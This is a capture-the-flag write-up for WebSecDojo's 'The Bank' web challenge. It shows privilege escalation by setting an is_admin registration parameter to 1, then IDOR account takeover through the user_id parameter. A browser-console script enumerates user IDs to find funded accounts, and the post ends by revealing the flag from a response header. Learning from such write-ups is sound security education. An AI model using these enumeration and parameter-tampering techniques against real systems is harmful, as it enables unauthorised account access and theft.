# WebSecDojo.com - The Bank
## My first post :)!!
### Prerequisites
<ul>
  <li>HTML and Javascript experience.</li>
  <li>Basic knowledge of HTTP requests and API endpoints.</li>
  <li>Developer Panel (I recommend using firefox) or similar software that enables sending web requests.</li>
</ul>
### Exploring the website
  After entering the challenge I was in `https://websecdojo.com/thebank/index.php`.<br/>
  Since I didn't have an account I thought it'd be better to attempt to create one so I clicked `Don't have an account? Register here`.
### Trying to register
  First because I know it's a CTF challenge focused on HTTP requests I opened the network tab.<br/>
  Entered fabricated data and submitted the web-form.
  Found a `POST` request to this URL: `https://websecdojo.com/thebank/register.php`.
  The request's had a parameter named `is_admin` the was set to `0`. When changed to `1`, resending the request will result in a `GET` request to the URL: `https://websecdojo.com/thebank/dashboard.php`.
### The dashboard
  Go to `https://websecdojo.com/thebank/dashboard.php` in your browser.
  While the network tab is open try to fill out the form, the request returns failure as response.
  We can see in the request that in the URL there's a parameter named `user_id`.
  Going through the dashboard's HTML I found the function that submits the form.
### Examining the form submission
Examine this simple function:
```js
        function handleTransfer(event) {
            event.preventDefault();
            
            const form = document.getElementById('transferForm');
            const formData = new FormData(form);
            
            // Get user_id from URL or default to 0
            const urlParams = new URLSearchParams(window.location.search);
            const userId = urlParams.get('user_id') || '0';
            
            // Add user_id to formData
            formData.append('user_id', userId);
            
            fetch('api.php?user_id=' + userId, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                const messageDiv = document.getElementById('transferMessage');
                if (data.success) {
                    messageDiv.className = 'alert alert-success mt-3';
                    messageDiv.textContent = 'Transfer successful!';
                    form.reset();
                } else {
                    messageDiv.className = 'alert alert-danger mt-3';
                    messageDiv.textContent = data.message || 'Transfer failed. Please try again.';
                }
            })
            .catch(error => {
                const messageDiv = document.getElementById('transferMessage');
                messageDiv.className = 'alert alert-danger mt-3';
                messageDiv.textContent = 'An error occurred. Please try again.';
                console.error('Error:', error);
            });
            
            return false;
        }
```
        
Basically, the function checks the URL for parameters, if non found the `user_id` will be set as `0`.
### Trying to switch into a user that has funds
I added `?user_id=0` to the URL resulting in this: `https://websecdojo.com/thebank/dashboard.php?user_id=0`.
Now the user's named `User Bobbetta` instead of `Admin` and yet still has no balance.
Trying to fill out the form again and submitting it results in failure response.
Trying different IDs return the same user.
Assuming the IDs can be enumerated i wrote this script (ChatGPT wrote it for me ;)):
```js
let id = 0;
const maxAttempts = 5000; // adjust as needed
const delay = 200; // ms delay between requests to avoid hammering the server

function checkNextId() {
    if (id > maxAttempts) {
        console.log("Reached maximum attempts.");
        return;
    }

    fetch(`https://websecdojo.com/thebank/dashboard.php?user_id=${id}`, {
        credentials: 'include' // keep session cookies
    })
    .then(res => res.text())
    .then(html => {
        // Look for the admin HTML marker
        if (html.includes('<span id="username">Admin</span>')) {
            console.log(`🎯 Found Admin at user_id=${id}`);
            console.log(`URL: https://websecdojo.com/thebank/dashboard.php?user_id=${id}`);
            // Optionally open in new tab:
            window.open(`https://websecdojo.com/thebank/dashboard.php?user_id=${id}`, '_blank');
        } else if (!html.includes('User Bobbetta')) {
            console.log(`✅ Found non-Bobbetta user at id=${id}`);
        } else {
            console.log(`⛔ Skipped id=${id}`);
        }
    })
    .catch(err => {
        console.warn(`Error at id=${id}:`, err);
    })
    .finally(() => {
        id++;
        setTimeout(checkNextId, delay);
    });
}

checkNextId();

```
Pasted it in the console that's in the Developer Panel and found two users with IDs `10` and `11`.

### Switching into user that has funds
I entered this URL: `https://websecdojo.com/thebank/dashboard.php?user_id=10`
Got into a user named `User John Doe` with `$10000`.
Filled out the form with fabricated information.
The website showed failure yet the request returned success.

### Getting the flag
This one took me a while...
Often most people overlook certain parts of HTTP requests. In this Case it was the `Response Headers`.
Looking there you will find the flag header: `x-flag: flag#Th@tWas3asyN0?`

### Conclusions
Examine the request thoroughly, you can use ChatGPT for this if you're lazy.

### Important remarks
I want to thank Avi who created the CTF challnge and gave me the clue to the last part. I overlooked the Response Headers.
Check out his awesome Web CTFs website: https://websecdojo.com/


